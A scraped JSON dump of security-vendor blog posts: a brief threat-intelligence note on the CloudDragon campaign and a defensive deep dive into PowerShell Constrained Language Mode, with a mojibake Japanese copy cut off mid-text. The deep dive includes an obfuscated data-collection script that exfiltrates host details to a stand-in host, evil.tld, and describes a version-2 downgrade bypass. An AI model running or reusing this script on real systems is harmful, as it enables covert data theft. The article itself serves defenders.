hunting","createdAt":"2022-05-06T08:15:54.413Z","updatedAt":"2022-05-06T08:15:54.413Z","__typename":"Tag"}],"topic":{"id":"6","name":"News","category":"news_and_events","color":"#908883","contents":[{"id":"9","text":"News","locale":"en","__typename":"ComponentTopicsTopicContent"},{"id":"14","text":"æ°è","locale":"tw","__typename":"ComponentTopicsTopicContent"},{"id":"18","text":"ãã¥ã¼ã¹","locale":"jp","__typename":"ComponentTopicsTopicContent"}],"__typename":"Topic"},"author":{"id":"1","email":"pr@teamt5.org","username":"TeamT5 Media Center","__typename":"UsersPermissionsUser"}},{"contents":[{"id":"57","locale":"en","title":"CloudDragon's Campaign: VPN Zero-day Vulnerability + New Backdoor","context":"TeamT5 recently discovered two installers of a newly identified backdoor which we named MemzipRAT. The backdoor is named after an embedded string \"get module from cmd memzip : %d\" inside the PE files.\n\n## About TeamT5's Research Findings\n\nWith further investigation, we believe this attack was aiming at a South Korean company in the aerospace sector. The company is part of a top 10 conglomerate in South Korea, whose business includes aerospace, chemicals, financial services, IT, etc.\n\nIn fact, CloudDragon has been accused of using VPN vulnerabilities to attack numerous entities, including Korean government agencies [1], recently. It is highly possible that they deployed their new malware by the new vulnerability in this case as well. \n\n\u003cbr\u003e\n\nYet, there are two key factors that might pull the trigger of massive intrusions:\n\n1. VPN vulnerability\n\n The VPN market in 2020 is USD $30 billion worldwide. That is, the market is huge and has multiple players inside. It could be a starting point for actors to infiltrate various corporations not only in South Korea, but to the whole world.\n \n2. Sectors involved\n\n As the identified target involved in crucial sectors, such as IT, it has a great chance to affect hundreds of entities in a short period.\n\n\u003cbr\u003e\n\nWe strongly advise everyone to take careful attention to CloudDragon's recent campaign for it might end up a severe supply chain attack.\n\n## Reference\n\n[1] https://biz.chosun.com/policy/politics/2021/06/18/V4DTFCEXPRA4DFCBVVJO3DPR5I/\n\n\u003cbr\u003e\n\n\u003cbr\u003e\n\n*Image courtesy of [Pixabay](https://pixabay.com/photos/flag-banner-nation-emblem-country-2528969/)","__typename":"ComponentPostPostContext"},{"id":"150","locale":"jp","title":"CloudDragonã®æ»æï¼VPNã¼ã­ãã¤èå¼±æ§ ï¼ æ°ããããã¯ãã¢","context":"åæ¥ãTeamT5ã¯æ°ãã«ç¹å®ãããããã¯ãã¢ãããªãã¤ã³ã¹ãã¼ã©ã¼ã2ã¤çºè¦ããMemzipRATã¨åä»ãã¾ããããã®ããã¯ãã¢ã®ååã¯ãPEãã¡ã¤ã«åã«åãè¾¼ã¾ããæå­åãget module from cmd memzip : %dãã«ç±æ¥ãã¦ãã¾ãã\n\n## TeamT5ã®èª¿æ»çµæ\n\nãããªãèª¿æ»ã®çµæããã®æ»æã¯èªç©ºå®å®åéã«å±ããéå½ä¼æ¥­ãçã£ããã®ã ã¨å½ç¤¾ã§ã¯èãã¦ãã¾ãããã®éå½ä¼æ¥­ã¯ãèªç©ºå®å®ãåå­¦ãéèãITãªã©ãææããéå½ã®ããã10ã«å¥ãè¤åä¼æ¥­ã®1ç¤¾ã§ãã\n\nå®éãCloudDragonã¯æè¿ã«ãªã£ã¦ãVPNã®èå¼±æ§ãå©ç¨ãã¦ãéå½æ¿åºæ©é¢ [1]ãå«ããå¤æ°ã®äºæ¥­ä½ãæ»æãããã¨ã§éé£ãåãã¦ãã¾ããä»åãæ°ããªèå¼±æ§ãå©ç¨ãã¦ãæ°ããªãã«ã¦ã§ã¢ãå±éããå¯è½æ§ãé«ãã¨èãã¦ãã¾ãã\n\n\u003cbr\u003e\n\nããããªããããããã®æ»æã«ã¯ãå¤§è¦æ¨¡ãªä¾µå¥ã®å¼ãéã¨ãªããããããªãéå¤§ãªè¦å ã2ã¤å­å¨ãã¾ãã\n\n1. VPNã®èå¼±æ§\n\n 2020å¹´ã®VPNå¸å ´ã¯ãå¨ä¸çã§300åç±³ãã«ã¨ãªãã¾ãããã¤ã¾ãå¸å ´ã¯éå¸¸ã«å·¨å¤§ã§ãããè¤æ°ã®ãã¬ã¼ã¤ã¼ãå­å¨ãã¾ããéå½ã ãã§ãªããå¨ä¸çã®æ§ããªä¼æ¥­ã«èå¨ã¢ã¯ã¿ã¼ãæ½å¥ããããã®éå§ç¹ã¨ãªãå¯è½æ§ãããã¾ã\n \n2. ã¿ã¼ã²ããã¨ãªãåé\n\n ç¹å®ãããã¿ã¼ã²ããã«ã¯ITãªã©ã®éè¦ãªåéãå«ã¾ãã¦ãããããç­æéã«æ°ç¾ç¤¾ã«ãã®ã¼ãä¼æ¥­ã«å½±é¿ãä¸ããå¯è½æ§ãããã¾ãã\n\n\u003cbr\u003e\n\nä»åã®CloudDragonã®æ»æã¯ããµãã©ã¤ãã§ã¼ã³ã«å¯¾ããæ·±å»ãªæ»æã¸ã¨ã¤ãªããæãããããããååãªæ³¨æãå¿è¦ã§ãã\n\n## åèæç®\n\n[1] https://biz.chosun.com/policy/politics/2021/06/18/V4DTFCEXPRA4DFCBVVJO3DPR5I/\n\n\u003cbr\u003e\n\n\u003cbr\u003e\n\n**ç»åã®ã½ã¼ã¹: [Pixabay](https://pixabay.com/photos/flag-banner-nation-emblem-country-2528969/)","__typename":"ComponentPostPostContext"}],"publishedAt":"2022-04-05T03:14:29.990Z","publish_date":"2021-06-30T18:00:00.000Z","createdAt":"2021-06-29T13:36:00.041Z","updatedAt":"2022-06-22T01:04:31.578Z","banner_img_url":"https://uploads.teamt5.org/upload/files/flag_2528969_1920_10918af673_update.webp","thumb_img_url":null,"post_name":"CloudDragon's Campaign: VPN Zero-day Vulnerability + New Backdoor","post_url":"clouddragon-campaign-vpn-zero-day-vulnerability-new-backdoor","enable_form":false,"attachment_id":null,"attachment_folder_id":null,"top_order":null,"__typename":"Post","tags":[{"id":"23","name":"supply chain attack","createdAt":"2020-05-28T17:48:45.048Z","updatedAt":"2020-05-28T17:54:04.229Z","__typename":"Tag"},{"id":"33","name":"cyber espionage","createdAt":"2020-06-19T09:18:40.849Z","updatedAt":"2020-06-19T09:18:40.849Z","__typename":"Tag"},{"id":"101","name":"CloudDragon","createdAt":"2021-05-11T17:38:28.264Z","updatedAt":"2021-05-11T17:38:28.274Z","__typename":"Tag"},{"id":"41","name":"cyber threat intelligence","createdAt":"2020-06-19T09:26:13.025Z","updatedAt":"2020-10-14T11:42:12.270Z","__typename":"Tag"},{"id":"124","name":"threat hunting","createdAt":"2022-05-06T08:15:54.413Z","updatedAt":"2022-05-06T08:15:54.413Z","__typename":"Tag"}],"topic":{"id":"2","name":"Threat Intelligence","category":"blogs","color":"#6d96bd","contents":[{"id":"2","text":"Threat Intelligence","locale":"en","__typename":"ComponentTopicsTopicContent"},{"id":"4","text":"å¨èæè³","locale":"tw","__typename":"ComponentTopicsTopicContent"},{"id":"10","text":"èå¨æå ±","locale":"jp","__typename":"ComponentTopicsTopicContent"}],"__typename":"Topic"},"author":{"id":"10","email":"CTI@example.com","username":"Cyber Threat Intelligence","__typename":"UsersPermissionsUser"}},{"contents":[{"id":"41","locale":"en","title":"A Deep Dive into PowerShell's Constrained Language Mode","context":"## What is Constrained Language Mode and Why it Matters\n\nWhen PowerShell was [first announced in 2006](https://betanews.com/2006/11/14/windows-powershell-1-0-released/), it was meant to be a flexible command-line shell that features an easy-to-understand yet advanced scripting engine for IT admins. Fast forward to (almost) a decade and a half later, PowerShell has caught up in popularity and has superseded the now-legacy `cmd.exe` in current Windows 10 releases.\n\nHowever, PowerShell has also been weaponized heavily over the past decade. There is an abundance of PowerShell-based samples all over public sandboxes, and [APTs are known to abuse it whenever possible](https://attack.mitre.org/techniques/T1059/001/). The advanced scripting engine is often utilized to launch fileless/in-memory attacks or [use it as a way around AMSI](https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/). In this post, we will be focusing on a lesser-known feature that can be used to combat this threat: Language Mode.\n\nPowerShell was launched with an option to change its [\"Language Mode\"](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.2). This Language Mode option allows the user to switch between syntaxes allowed or disallowed. By default, all PowerShell sessions are launched with `FullLanguage`, which permits all the available syntaxes and cmdlets at runtime. There are four total language modes available: `FullLanguage`, `RestrictedLanguage`, `NoLanguage` and finally `ConstrainedLanguage`. In today's topic, we are here to focus on the `ConstrainedLanguage` mode introduced in PowerShell 3.0.\n\n\u003cbr\u003e\n\n### Safer PowerShell Environment\n\nFirst off, let's take a look at what Microsoft Docs says about the `ConstrainedLanguage` mode:\n\n\u003e - All cmdlets in Windows modules, and other UMCI-approved cmdlets, are fully functional and have complete access to system resources, except as noted.\n\u003e - All elements of the PowerShell scripting language are permitted.\n\u003e - All modules included in Windows can be imported and all commands that the modules export run in the session.\n\u003e - In PowerShell Workflow, you can write and run script workflows (workflows written in the PowerShell language). XAML-based workflows are not supported and you cannot run XAML in a script workflow, such as by using Invoke-Expression -Language XAML. Also, workflows cannot call other workflows, although nested workflows are permitted.\n\u003e - The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.\n\u003e - The New-Object cmdlet can be used only on allowed types (listed below).\n\u003e - Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.\n\u003e - Type conversion is permitted, but only when the result is an allowed type.\n\u003e - Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.\n\u003e - The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.\n\u003e - Users can get all properties of allowed types. Users can set the values of properties only on Core types. Only the following COM objects are permitted:\n\u003e   - Scripting.Dictionary\n\u003e   - Scripting.FileSystemObject\n\u003e   - VBScript.RegExp\n\n\u003cbr\u003e\n\n#### No Arbitrary C# Code via Add-Type\n\n\u003e The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.\n\nMany PowerShell-based exploits rely on .NET-based language compilation via `Add-Type` - and that's already thrown out the window by disallowing arbitrary C# code compilation.\n\n![202101-1.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic1.png)\n\n\u003cbr\u003e\n\n#### Non-whitelisted Types are Prohibited\n\n\u003e - The New-Object cmdlet can be used only on allowed types (listed below).\n\u003e - Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.\n\u003e - Type conversion is permitted, but only when the result is an allowed type.\n\u003e - Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.\n\u003e - The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.\n\nIn laymen's terms, every non-whitelisted type and its methods/properties are blocked from execution. Classes such as `System.Reflection.Assembly`/`System.Convert`/`System.Runtime.CompilerServices` and many more are out-of-reach for threat actors, making code injection or fileless attacks that rely on additional PEs much more difficult.\n\n![202101-2.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic2.png)\n\n\u003cbr\u003e\n\n### Prohibit Complex Scripts from Executing\n\nGiven the above limitations, this does mean that legitimate complex scripts may not be able to execute correctly. For instance, if your organization uses a script that utilizes WinForm or WPF (Windows Presentation Framework), those will not work at all.\n\n![202101-3.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic3.png)\n\nConsequentially, modules are affected by this whitelisting system as well. Modules that rely on created types or non-whitelisted type calls will not load properly.\n\n![202101-4.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic4.png)\n\nTherefore, it is crucial to **double-check your organization's scripts** (if you have any) *before* enrolling this policy to your endpoints.\n\n\u003cbr\u003e\n\n### Require Explicit Feature Enrollment\n\nSince, by default, this language mode is an opt-in feature, the user would either have to call `$ExecutionContext.SessionState.LanguageMode = \"ConstrainedLanguage\"` at the beginning of each session or add `__PSLockdownPolicy` to the system environment variables (**DO NOT** do this for production. [See the section below](#beware-of-pslockdownpolicy). Neither of which is ideal and should only be used for debugging, unit testing, or for general testing purposes only.\n\nInstead, the administrator(s) of your organization should deploy via WDAC (Windows Defender Application Control) on Windows 10+ *or* via AppLocker on Windows 7+. When implemented this way, the attacker will first have to bypass WDAC or AppLocker before gaining full control of a standard PowerShell session. A guideline regarding the deployment for individual or mass number of endpoints can be found under the [Application Control for Windows](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control) article on Microsoft Docs.\n\n\u003cbr\u003e\n\n### Effective Against Scripts, not Standard Cmdlets\n\nIt must be made clear that merely enabling Constrained Language Mode is not enough to mitigate the risks PowerShell can bring. While restricting users to a lower-privileged language mode ensures no custom .NET assemblies or code can be executed, this does not stop attackers from crafting malicious scripts from the built-in cmdlets alone. For example, an attacker may still be able to craft a script that collects relevant intel about the computer and send it back to their C2 station.\n\nThe following, as an example, will continue to run fine under a PowerShell session with Constrained Language mode enabled.\n\n```ps1\nStart-Job -ScriptBlock {\n while($true){\n  # MAC address collection\n  .(\"{1}{3}{2}{0}\" -f 'ariable', 'S', 't-V', 'e') -Name (\"{1}{0}\" -f 'ata', 'd') -Value (.(\"{3}{2}{0}{1}\" -f 'Ada', 'pter', 'Net', 'Get-') | .(\"{1}{0}\" -f 'ect', 'sel') (\"{1}{0}{3}{2}\" -f 'erfac', 'Int', 's', 'eAlia'), (\"{0}{1}{2}\" -f 'MacA', 'd', 'dress') | \u0026(\"{3}{2}{0}{1}\" -f 'r', 'tTo-Json', 'e', 'Conv') -Compress) \u003e $null\n  # OSs + username collection\n  .(\"{2}{0}{1}\" -f '-', 'Variable', 'Set') -Name (\"{0}{1}\" -f 'd', 'ata') -Value (${D`ATa} + (.(\"{0}{2}{3}{1}\" -f 'Ge', 'nce', 't-CimInst', 'a') (\"{1}{0}{3}{2}\" -f 'ting', 'Win32_Opera', 'em', 'Syst') | .(\"{0}{1}\" -f 'se', 'lect') (\"{0}{1}\" -f 'na', 'me'), (\"{1}{0}\" -f 'me', 'CSNa') | \u0026(\"{2}{3}{1}{0}{4}\" -f 'o-Js', 'T', 'Conve', 'rt', 'on') -Compress)) \u003e $null\n  # WAN IP collection\n  \u0026(\"{0}{1}{2}{3}\" -f 'Set-', 'Vari', 'abl', 'e') -Name (\"{1}{0}\" -f 'ta', 'da') -Value (${D`AtA} + ((.(\"{1}{0}\" -f 'r', 'iw') -useb (\"{1}{0}{2}\" -f 'fig', 'ifcon', '.me') -user (\"{0}{1}\" -f 'cur', 'l')).\"cO`NTe`Nt\")) \u003e $null\n  # Saves data to a temporary file (usually this is done in-memory by threat actors, but in-memory execution purely based on existing cmdlets is either impossible or very difficult)\n  .(\"{1}{0}{2}\" -f '-Variabl', 'Set', 'e') -Name ('a') -Value (\"$env:temp\\$(New-Guid).txt\")\n  ${Da`Ta} | \u0026(\"{1}{2}{0}\" -f 'le', 'O', 'ut-Fi') ${a}\n  # Compresses the file\n  \u0026(\"{3}{0}{2}{1}\" -f 'ompr', 'Archive', 'ess-', 'C') -De \"$a.zip\" -Co (\"{0}{1}\" -f 'Op', 'timal') -Lit ${a}\n  # Sends it back to the C2 station\n  \u0026(\"{1}{0}\" -f 'r', 'iw') (\"{0}{2}{3}{4}{1}\" -f 'h', '00', 'ttp://evil', '.tld:', '80') -method (\"{1}{0}\" -f 'st', 'po') -body (.(\"{1}{0}{2}\" -f 'Co', 'Get-', 'ntent') -Lit \"$a.zip\") \u003e $null\n  \u0026(\"{2}{1}{0}\" -f 'leep', 't-S', 'Star') -Seconds 2\n  }\n}\n```\n\nAdditionally, attackers may still be able to call external resources to achieve their goal, such as achieving persistence via `schtask` or placing additional payloads under `shell:startup`. Remember, Constrained Language mode does **NOT** block most existing cmdlets from functioning; in other words, it limits what the threat actor has on their disposal, but does not mean that they cannot make do with vanilla cmdlets or standard Windows applications.\n\n\u003cbr\u003e\n\n#### Beware of `__PSLockdownPolicy`\n\nAside from weaponizing existing cmdlets, if the admins had \"enabled\" the language feature via `__PSLockdownPolicy`, then it would be trivial for attackers with administrative privileges to restore the language policy. Let's take a look at what this environment variable actually does.\n\n![202101-5.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic5.png)\n\nWe'll see that it has brought us to the `SystemPolicy` class under the `wldpNativeMethods.cs` file. In various articles that reference this environment variable, they would instruct the administrator to set the `__PSLockdownPolicy` variable to `4`. A value of 4 corresponds with the `WLDP_LOCKDOWN_UMCIENFORCE_FLAG` constant, which indicates the enforcement of UMCI (User-mode Code Integrity).\n\n![202101-6.gif](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic6.gif)\n\nThe call's parent method happens to be named `GetDebugLockdownPolicy`, which indicates that this behavior was meant to be a debug feature, rather than something that should be in a production environment.\n\n![202101-7.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic7.png)\n\nThis theory is further backed up by the statement made by [Matt Graeber](https://twitter.com/mattifestation/status/921509830644269062), a renowned security researcher well-versed in WDAC. Further research also shows this behavior was mentioned by the PowerShell team in its [official post regarding Constrained Language Mode as well](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/):\n\n\u003e As part of the implementation of Constrained Language, PowerShell included an environment variable for debugging and unit testing called `__PSLockdownPolicy`. While we have never documented this, some have discovered it and described this as an enforcement mechanism. This is unwise because an attacker can easily change the environment variable to remove this enforcement. In addition, there are also file naming conventions that enable FullLanguage mode on a script, effectively bypassing Constrained Language.\n\nIt must be emphasized that administrators should **NOT** deploy this to their endpoints as a way to enable Constrained Language mode - and be extra mindful when reading through articles regarding security features.\n\n\u003cbr\u003e\n\n### Compatibility with Legacy OSs\n\nAnother thing to consider before rolling this feature out to endpoints is legacy OSs. As mentioned at the beginning of this post, Constrained Language mode is only available on PowerShell 3.0 onwards - and Windows 7 ships with PowerShell 2.0 by default.\n\n![202101-8.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic8.png)\n\nWhile it is possible to install WMF 5.1 on older systems such as Windows 7, these systems likely ship with PowerShell 2.0 as its core component as well, which is susceptible to *downgrade attacks*.\n\nAll the attacker needs to do is, instead of starting a standard PowerShell 5.1 session, spawn a PowerShell 2.0 session using `PowerShell.exe -Version 2`. Since `ConstrainedLanguage` mode doesn't exist in that version, it will simply fallback to using `FullLanguage`.\n\n![202101-9.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic9.png)\n\nThis is much less of a problem on Windows 10, as PowerShell 5.1 is shipped with the system by default and 2.0 can be removed by using `Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`. After then, any attempts to launch PowerShell v2 will result in an error message.\n\n```text\nPS C:\\\u003e powershell -v 2\nEncountered a problem reading the registry.  Cannot find registry key SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine. The Windows PowerShell 2 engine is not installed on this computer.\n```\n\n\u003cbr\u003e\n\n## Hypothetical Testing\n\nTo see how effective this mode is against hypothetical attacks, we ...\n\n- gathered 141 recently-submitted unique PowerShell samples as of Jan 27th, 2021.\n  - These samples were randomly chosen and were not handpicked (aside from picking out invalid samples that aren't `*.ps1` scripts) in any way.\n- executed the scripts via `ls -File | %{start-job -scr {iex $args[0]} -arg $_.FullName}`.\n- ran these samples on a system with `ConstrainedLanguage` mode enabled.\n- ran these samples on a Windows 10 (build 19042) system with a non-elevated PowerShell session.\n  - Elevation is taken out of the equation as attackers would have to escalate its privilege first, and by that point there will be bigger problems to worry about.\n\n![202101-10.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic10.png)\n\n\u003cbr\u003e\n\nIn our testing,\n\n- `ConstrainedLanguage` blocked ...\n  - 100% (141/141) of the samples from executing properly.\n    - ... as in reaching their intended goal of launching a TCP shell, loading its next-stage payload, creating usable persistence, etc.\n  - 51% (72/141) of the samples that had attempted to create a non-whitelisted type.\n  - 50% (71/141) of the samples that had attempted to invoke a method on non-whitelisted type.\n  - 26.9% (38/141) of the samples that had attempted to convert a value into a non-whitelisted type.\n  - 2.8% (4/141) of the samples that had attempted to set a property on a non-whitelisted type.\n- `ConstrainedLanguage` failed to block ...\n  - 0.7% (1/141) of the samples that had managed to create persistence entries.\n\n\u003cbr\u003e\n\n## Conclusion\n\nSince PowerShell is now [an integral part](https://support.microsoft.com/en-us/windows/powershell-is-replacing-command-prompt-fdb690cf-876c-d866-2124-21b6fb29a45f) of modern Windows OSs, sysadmins should not underestimate the risks that PowerShell can bring to the organization.\n\nIn the article, we went through the benefits and drawbacks of `ConstrainedLanguage` and how it performs in a hypothetical test. By enabling the engine feature, the risk of PowerShell-introduced exploitation is greatly lowered - if enrolled properly. Organizations should also consider whether or not the reduced availability of modules and or scripts is worth the tradeoff before enrolling this language policy.\n\n\u003cbr\u003e\n\n\n*Image courtesy of [Pexels](https://www.pexels.com/)\n","__typename":"ComponentPostPostContext"},{"id":"145","locale":"jp","title":"PowerShellã®Constrained Languageï¼å¶ç´ä»ãè¨èªï¼ã¢ã¼ãã«å¯¾ããæ·±ãèå¯","context":"## Constrained Languageï¼å¶ç´ä»ãè¨èªï¼ã¢ã¼ãã®èª¬æã¨ããã®ã¢ã¼ããéè¦ãªçç±\n\n[2006å¹´ã«åãã¦çºè¡¨ãããå½åã®PowerShellã¯](https://betanews.com/2006/11/14/windows-powershell-1-0-released/), ãåããããããªãããé«åº¦ãªã¹ã¯ãªããã¨ã³ã¸ã³æ©è½ãæãããITç®¡çèåãã®æè»ãªã³ãã³ãã©ã¤ã³ã·ã§ã«ã¨ããä½ç½®ã¥ãã§ãããããããã»ã¼15å¹´ãçµã£ãä»ãPowerShellã¯ãã®äººæ°ãåãæ»ããç¾å¨ã®Windows 10ã§ã¯ãä»ãä¼èª¬ã¨ãªã£ã```cmd.exe```ã®åº§ãå¥ªã£ã¦ãã¾ãã\n\nããããªãããPowerShellã¯ããã®10å¹´ã®éã«æ»æã«ãé »ç¹ã«ä½¿ç¨ããã¦ãã¾ããå¬éããã¦ãããµã³ãããã¯ã¹ã«ã¯ãPowerShellãã¼ã¹ã®ãµã³ãã«ãããµãã¦ããã[APTã¯ã§ããã ãåºç¯å²ã«ãããæªç¨ãããã¨ãç¥ããã¦ãã¾ã](https://attack.mitre.org/techniques/T1059/001/)ã é«åº¦ãªã¹ã¯ãªããã¨ã³ã¸ã³ã¯ããã¡ã¤ã«ã¬ã¹/ã¤ã³ã¡ã¢ãªæ»æãä»æããããã®ãã¼ã«ã¨ãã¦ã[ãããã¯AMSIãåé¿ããææ®µã¨ãã¦é »ç¹ã«å©ç¨ããã¦ãã¾ã](https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/)ãæ¬è¨äºã§ã¯ããã®èå¨ã«å¯¾æããããã«ä½¿ç¨ã§ããã«ããããããããã¾ãç¥ããã¦ããªãæ©è½ï¼è¨èªã¢ã¼ãã«ç¦ç¹ãå½ã¦ããã¨æãã¾ãã\n\nPowerShellã¯ã [ãè¨èªã¢ã¼ãã](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.2)ãå¤æ´ã§ãããªãã·ã§ã³ãå«ã¾ããç¶æã§ãªãªã¼ã¹ããã¦ãã¾ãã ãã®è¨èªã¢ã¼ããªãã·ã§ã³ã§ã¯ãã¦ã¼ã¶ã¼ãè¨±å¯ããæ§æã¾ãã¯è¨±å¯ããªãæ§æãåãæ¿ãããã¨ãã§ãã¾ããããã©ã«ãã§ã¯ããã¹ã¦ã®PowerShellã»ãã·ã§ã³ã¯```FullLanguage```ï¼å¨è¨èªï¼ã§èµ·åããããããå©ç¨å¯è½ãªãã¹ã¦ã®æ§æã¨ã³ãã³ãã¬ãããã©ã³ã¿ã¤ã æã«è¨±å¯ããã¾ããå©ç¨ã§ããè¨èªã¢ã¼ãã¯å¨é¨ã§4ç¨®é¡ï¼```FullLanguage```ï¼å¨è¨èªï¼ã ```RestrictedLanguage```ï¼å¶éä»ãè¨èªï¼ã```NoLanguage```ï¼è¨èªãªãï¼ãããã¦```ConstrainedLanguage```ï¼å¶ç´ä»ãè¨èªï¼ã§ããä»åã¯ãPowerShell 3.0ããå°å¥ããã```Constrained Language```ï¼å¶ç´ä»ãè¨èªï¼ã¢ã¼ãã«ç¦ç¹ãå½ã¦ã¾ãã\n\n\n\n\u003cbr\u003e\n\n### å®å¨æ§ãåä¸ããPowerShellç°å¢\n\nã¾ããMicrosoftDocsã«ãã```Constrained Language```ï¼å¶ç´ä»ãè¨èªï¼ã¢ã¼ãã®èª¬æãè¦ã¦ã¿ã¾ãããã\n\n\u003e - Windowsã¢ã¸ã¥ã¼ã«ã®ãã¹ã¦ã®ã³ãã³ãã¬ãããããã³ãã®ä»ã®UMCIã§æ¿èªãããã³ãã³ãã¬ããã¯ãç¹è¨ããã¦ããå ´åãé¤ããå®å¨ã«æ©è½ããã·ã¹ãã ãªã½ã¼ã¹ã«å®å¨ã«ã¢ã¯ã»ã¹ãããã¨ãã§ããã\n\u003e - PowerShellã¹ã¯ãªããè¨èªã®ãã¹ã¦ã®è¦ç´ ãè¨±å¯ãããã\n\u003e - Windowsã«å«ã¾ãããã¹ã¦ã®ã¢ã¸ã¥ã¼ã«ãã¤ã³ãã¼ããããã¨ãã§ããã¢ã¸ã¥ã¼ã«ãã¨ã¯ã¹ãã¼ããããã¹ã¦ã®ã³ãã³ããã»ãã·ã§ã³ã§å®è¡ã§ããã\n\u003e - PowerShell Workflowã§ã¯ãã¹ã¯ãªããã¯ã¼ã¯ãã­ã¼ï¼PowerShell è¨èªã§è¨è¿°ãããã¯ã¼ã¯ãã­ã¼ï¼ãè¨è¿°ããå®è¡ãããã¨ãã§ãããXAMLãã¼ã¹ã®ã¯ã¼ã¯ãã­ã¼ã¯ãµãã¼ãããã¦ããããInvoke-Expression -Language XAMLãä½¿ç¨ãããªã©ãã¦ãã¹ã¯ãªããã¯ã¼ã¯ãã­ã¼ã§XAMLãå®è¡ãããã¨ã¯ã§ããªããã¾ããã¯ã¼ã¯ãã­ã¼ããä»ã®ã¯ã¼ã¯ãã­ã¼ãå¼ã³åºããã¨ã¯ã§ããªããããã¹ãããã¯ã¼ã¯ãã­ã¼ã¯è¨±å¯ãããã\n\u003e - Add-Typeã³ãã³ãã¬ããã¯ç½²åãããã¢ã»ã³ããªãèª­ã¿è¾¼ããã¨ãã§ããããä»»æã®C#ã³ã¼ããWin32 APIãèª­ã¿è¾¼ããã¨ã¯ã§ããªãã\n\u003e - New-Objectã³ãã³ãã¬ããã¯ãè¨±å¯ãããåï¼ä»¥ä¸ã®ãªã¹ããåç§ï¼ã«å¯¾ãã¦ã®ã¿ä½¿ç¨ã§ããã\n\u003e - PowerShellã§ã¯ãè¨±å¯ãããåï¼ä»¥ä¸ã®ãªã¹ããåç§ï¼ã®ã¿ãä½¿ç¨ã§ãããããä»¥å¤ã®åã¯è¨±å¯ãããªãã\n\u003e - åå¤æã¯è¨±å¯ããã¦ãããããã®çµæãè¨±å¯ãããåã§ããå ´åã®ã¿ã¨ãªãã\n\u003e - æå­åå¥åãåã«å¤æããã³ãã³ãã¬ãããã©ã¡ã¼ã¿ã¼ã¯ããã®çµæã®åãè¨±å¯ãããåã§ããå ´åã«ã®ã¿æ©è½ããã\n- è¨±å¯ãããåï¼ä»¥ä¸ã®ãªã¹ããåç§ï¼ã®ToString()ã¡ã½ããã¨.NETã¡ã½ãããå¼ã³åºããã¨ãã§ããããã®ä»ã®ã¡ã½ããã¯å¼ã³åºããã¨ãã§ããªãã\n\u003e - ã¦ã¼ã¶ã¼ã¯ãè¨±å¯ãããåã®å¨ãã­ããã£ãåå¾ãããã¨ãã§ãããã¦ã¼ã¶ã¼ã¯Coreåã§ã®ã¿ãã­ããã£ã®å¤ãè¨­å®ãããã¨ãã§ãããä»¥ä¸ã®COMãªãã¸ã§ã¯ãã®ã¿è¨±å¯ãããã\n\u003e   - Scripting.Dictionary\n\u003e   - Scripting.FileSystemObject\n\u003e   - VBScript.RegExp\n\n\n\u003cbr\u003e\n\n#### Add-Typeãä½¿ã£ãä»»æã®C#ã³ã¼ãã¯ä¸å¯\n\n\u003e Add-Typeã³ãã³ãã¬ããã¯ç½²åãããã¢ã»ã³ããªãèª­ã¿è¾¼ããã¨ãã§ããããä»»æã®C#ã³ã¼ããWin32 APIãèª­ã¿è¾¼ããã¨ã¯ã§ããªãã\n\nPowerShellãã¼ã¹ã®æªç¨ã§ã¯ã```Add-Type```ãä½¿ç¨ãã.NETãã¼ã¹ã®è¨èªã³ã³ãã¤ã«ãä½¿ç¨ããããã¨ãããããã¾ãããä»»æã®C#ã³ã¼ãã³ã³ãã¤ã«ãç¦æ­¢ããã¦ããã®ã§ããã§ã«ããã¯å©ç¨ã§ãã¾ããã\n\n![202101-1.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic1.png)\n\n\u003cbr\u003e\n\n#### ãã¯ã¤ããªã¹ãã«è¼ã£ã¦ããªãåã®ä½¿ç¨ãç¦æ­¢\n\n\u003e - New-Objectã³ãã³ãã¬ããã¯ãè¨±å¯ãããåï¼ä»¥ä¸ã®ãªã¹ããåç§ï¼ã«å¯¾ãã¦ã®ã¿ä½¿ç¨ã§ããã\n\u003e - PowerShellã§ã¯ãè¨±å¯ãããåï¼ä»¥ä¸ã®ãªã¹ããåç§ï¼ã®ã¿ãä½¿ç¨ã§ãããããä»¥å¤ã®åã¯è¨±å¯ãããªãã\n\u003e - åå¤æã¯è¨±å¯ããã¦ãããããã®çµæãè¨±å¯ãããåã§ããå ´åã®ã¿ã¨ãªãã\n\u003e - æå­åå¥åãåã«å¤æããã³ãã³ãã¬ãããã©ã¡ã¼ã¿ã¼ã¯ããã®çµæã®åãè¨±å¯ãããåã§ããå ´åã«ã®ã¿æ©è½ããã\n\u003e - 